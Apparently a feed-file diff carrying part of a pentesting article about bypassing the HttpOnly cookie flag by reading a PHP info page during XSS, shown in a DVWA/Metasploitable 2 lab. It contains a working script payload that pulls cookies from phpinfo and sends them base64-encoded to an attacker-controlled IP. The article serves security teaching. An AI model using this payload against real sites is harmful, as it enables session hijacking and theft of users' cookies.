-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://192.168.240.128/dvwa/phpinfo.php&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;startString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td class=&quot;e&quot;&amp;gt;HTTP_COOKIE &amp;lt;/td&amp;gt;&amp;lt;td class=&quot;v&quot;&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;startIndex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endIndex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;endString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;endIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;encodedCookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://192.168.240.129/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;?encodedCookies=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodedCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;});});&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;This payload is much more accurate than the one used in the previous section because it sends only the cookies to the web server, without all the non-relevant HTML code. Repeating all the process of the previous section but executing this payload instead of the other one, you will receive a GET request like this&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-improved-payload.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The encoded cookies are sent through the encodedCookies GET parameter, so decoding it with the burpsuite decoder we can get the user cookies&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-decoded-improved-payload.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As you can see, only the cookies are sent.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-2-4&quot; /&gt;
-
-&lt;h2 id=&quot;24-important-notes&quot;&gt;2.4. Important notes&lt;/h2&gt;
-
-&lt;p&gt;Ok, we can exfiltrate some user cookies with the flag &lt;em&gt;HttpOnly&lt;/em&gt; set to &lt;em&gt;true&lt;/em&gt; but… Can we exfiltrate all the user cookies of the website? The answer is &lt;strong&gt;it depends&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;Go to your browser and create some test cookies like in the following screenshot&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/test-cookies.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Don’t forget to set to &lt;em&gt;true&lt;/em&gt; the &lt;em&gt;HttpOnly&lt;/em&gt; flag and write the same paths of the screenshot below. If you go to the PHP info page you are going to see something like this&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-dvwa-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Not all the cookies are displayed but… Why? That’s because the &lt;em&gt;path&lt;/em&gt; value.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;PHP info page can be used to exfiltrate any user cookie whose path is a parent path of the path where the PHP info page is located. In other words, only cookies whose path is a prefixed path of the path in which the PHP info page is located can be exfiltrated.&lt;/span&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Taking into account that the PHP info page path is &lt;em&gt;/dvwa/phpinfo&lt;/em&gt; and applying this rule, we can now understand the above screenshot:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;em&gt;cookie1&lt;/em&gt; appears because the path &lt;em&gt;/dvwa/phpinfo&lt;/em&gt; is a parent path of the PHP info page path (both are the same path).&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;cookie2&lt;/em&gt; appears because the path &lt;em&gt;/dvwa&lt;/em&gt; is a parent path of the PHP info page path.&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;cookie3&lt;/em&gt; appears because the path &lt;em&gt;/&lt;/em&gt; is a parent path of the PHP info page path.&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;cookie4&lt;/em&gt; doesn’t appear because the path &lt;em&gt;/dvwa/phpinfo/test&lt;/em&gt; is not a parent path of the PHP info page path.&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;cookie5&lt;/em&gt; doesn’t appear because the path &lt;em&gt;/test&lt;/em&gt; is not a parent path of the PHP info page path.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;There is another PHP info page in the root path of &lt;em&gt;Metasploitable 2&lt;/em&gt; as you can see in the following screenshot&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-raiz-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The only cookie whose path is a parent path of the PHP info page path is &lt;em&gt;cookie3&lt;/em&gt;, that’s because is the only cookie displayed. You can see that the rule works.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-3&quot; /&gt;
-
-&lt;h2 id=&quot;3-conclusions&quot;&gt;3. Conclusions&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;em&gt;Metasploitable 2&lt;/em&gt; is a good environment for testing certain vulnerabilities and not having to create a vulnerable environment from scratch.&lt;/li&gt;
-  &lt;li&gt;Low severity vulnerabilities such as PHP info page disclosure are usually wrongly evaluated as “low severity” is often considered synonymous with “not important”.&lt;/li&gt;
-  &lt;li&gt;PHP info page disclosure can be used to bypass the &lt;em&gt;HttpOnly&lt;/em&gt; flag of some user cookies and exfiltrate them during an XSS exploitation. The only requirement is that the cookie path must be a parent path of the path where the PHP info page is located.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="pentesting article" /><category term="web" /><category term="burpsuite" /><category term="base64" /><category term="metasploitable 2" /><category term="xss" /><category term="exfiltrate cookies" /><category term="session hijacking" /><category term="php info page" /><category term="bypass" /><summary type="html">Pentesting article: how to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation.</summary></entry></feed>
+&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web" /><category term="osint" /><category term="amass" /><category term="httpx" /><category term="gau" /><category term="kxss" /><category term="utm parameters" /><category term="burpsuite" /><category term="portswigger" /><category term="xss" /><category term="bypass" /><summary type="html">Partial disclosure of a bug bounty report: reflected XSS bypassing a *302 Security Redirect* due to the presence of Javascript function calls.</summary></entry></feed>
